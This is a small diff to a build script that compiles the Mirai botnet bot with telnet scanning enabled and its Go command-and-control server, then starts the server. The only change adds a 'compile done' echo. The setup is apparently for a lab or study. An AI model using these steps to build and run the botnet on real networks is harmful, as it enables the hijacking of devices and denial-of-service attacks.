@@ -19,5 +19,6 @@ gcc -std=c99 source/bot/*.c -DDEBUG "-DMIRAI_TELNET" \
                         -static -g -o /root/mirai.dbg \
     && go build -o /root/cnc source/cnc/*.go \
     && mv source/prompt.txt /root && rm -rf source
+echo "compile done"
 
 cp mirai.dbg share/ && ./cnc
